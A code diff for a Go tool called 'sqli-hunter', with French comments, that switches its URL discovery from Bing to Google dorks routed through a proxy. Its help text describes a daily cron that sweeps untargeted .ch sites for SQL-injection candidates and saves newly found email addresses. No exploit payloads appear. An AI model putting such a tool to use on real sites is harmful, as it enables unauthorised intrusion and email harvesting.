@@ -95,7 +95,7 @@ func main() {
 }
 
 // normalizeArgs : seul « ch » en raccourci positionnel (chasse URLs vuln .ch).
-// Pas de fetch par site (css.ch, etc.) — utiliser -D ch + Bing dorks.
+// Pas de fetch par site (css.ch, etc.) — utiliser -D ch + Google dorks.
 func normalizeArgs(args []string) []string {
 	if len(args) == 0 {
 		return args
@@ -190,7 +190,7 @@ func parseArgs(args []string) (config, error) {
 		rateLimit:      100,
 		outputDir:      "results",
 		discoverSubs:   true,
-		discoverSource: "bing",
+		discoverSource: "google",
 		params:         make(map[string]string),
 		data:           make(map[string]string),
 		headers:        make(map[string]string),
@@ -259,7 +259,7 @@ func parseArgs(args []string) (config, error) {
 		case arg == "--source":
 			i++
 			if i >= len(args) {
-				return cfg, fmt.Errorf("--source nécessite bing ou wayback")
+				return cfg, fmt.Errorf("--source nécessite google ou wayback")
 			}
 			cfg.discoverSource = args[i]
 		case arg == "--rescan":
@@ -502,7 +502,7 @@ Mode daily (cron quotidien) :
   sqli-hunter daily
   sqli-hunter daily --discover-limit 3000 --url-threads 64
 
-  → Bing dorks .ch (pas de ciblage)
+  → Google dorks .ch via proxy (DISCOVER_PROXY dans sqli-hunter.env)
   → Skip URLs/domaines déjà traités
   → Seulement nouveaux emails dans results/emails/
 
@@ -522,7 +522,7 @@ Cible:
       --json <JSON>           Corps JSON (mode -u)
 
 Découverte (avec -D) :
-      --source <bing|wayback> Collecteur URLs [défaut: bing]
+      --source <google|wayback> Collecteur URLs [défaut: google]
       --paths <a,b,c>         Filtre manuel path (optionnel)
       --discover-params <a,b> Filtre manuel paramètres (optionnel)
       --discover-output <f>   Fichier scope [défaut: scope_DOMAIN.ch.txt]
